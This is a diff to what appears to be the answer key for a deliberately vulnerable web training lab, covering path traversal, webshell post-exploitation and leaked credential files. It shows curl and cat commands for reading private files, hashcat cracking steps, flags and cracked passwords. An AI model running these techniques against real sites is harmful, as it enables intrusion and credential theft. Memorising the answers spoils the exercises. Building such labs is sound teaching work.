@@ -95,7 +95,7 @@ not known" error, and the blind level forces write-then-read exfiltration.
 ## 6. LFI / path traversal  (`index.php?page=`)
 **Answer:** `page` is included with no sanitisation, so `../` escapes the `pages/` directory.
 Decode/crack reps: besides `flag.txt` (plaintext), the same out-of-webroot dir has `flag_b64.txt`
-(`base64 -d`) and `flag_salted.txt` (`admin:<md5>:<salt>` → `hashcat -m 10` → `monkey`); and the hard/expert
+(`base64 -d`) and `flag_salted.txt` (`<md5>:<salt>` → `hashcat -m 10` → `monkey`); and the hard/expert
 levels inherently return the file `php://filter`-encoded (base64 → decode; rot13 → decode).
 **Command:**
 ```
@@ -122,8 +122,8 @@ Post-ex per level reads the flag in a harder form (webshell CWD is `uploads/`, s
 ```
 cat ../private/upload_flag.txt                          # easy   -> FLAG{w3bshell_upl0ad_to_rce}
 cat ../private/upload_flag.b64 | base64 -d              # medium -> FLAG{upl0ad_rce_b64_pivot}
-cat ../private/upload_flag.md5                          # hard   -> admin:<md5>  -> hashcat -m 0    -> sunshine
-cat ../private/upload_flag.sha256salt                   # expert -> admin:<sha256>:<salt> -> hashcat -m 1410 -> pokemon
+cat ../private/upload_flag.md5                          # hard   -> <md5>  -> hashcat -m 0    -> sunshine
+cat ../private/upload_flag.sha256salt                   # expert -> <sha256>:<salt> -> hashcat -m 1410 -> pokemon
 ```
 
 ## 8. Weak CSP + cookie theft  (every page)
@@ -183,10 +183,10 @@ curl -s "$U/config.php.bak"                                        # ADMIN_PASS 
 # medium — base64-encoded (file is pure base64, decode directly):
 curl -s "$U/private/creds_medium.b64" | base64 -d                  # admin:Sup3rStaging!99
 # hard   — unsalted hash -> identify + crack:
-curl -s "$U/private/creds_hard.txt"                                # admin:<sha1>
+curl -s "$U/private/creds_hard.txt"                                # <sha1>
 hashid '<sha1>'   # SHA-1 ; then:  hashcat -m 100 hash.txt rockyou.txt   -> chocolate
 # expert — salted hash (hash:salt) -> crack with the matching mode:
-curl -s "$U/private/creds_expert.txt"                              # admin:<md5>:<salt>
+curl -s "$U/private/creds_expert.txt"                              # <md5>:<salt>
 hashcat -m 10 hash.txt rockyou.txt   # feed 'hash:salt' (md5(pass.salt))  -> liverpool
 ```
 **Lesson:** "info disclosure" is rarely one plaintext file — leaked backups expose secrets at every
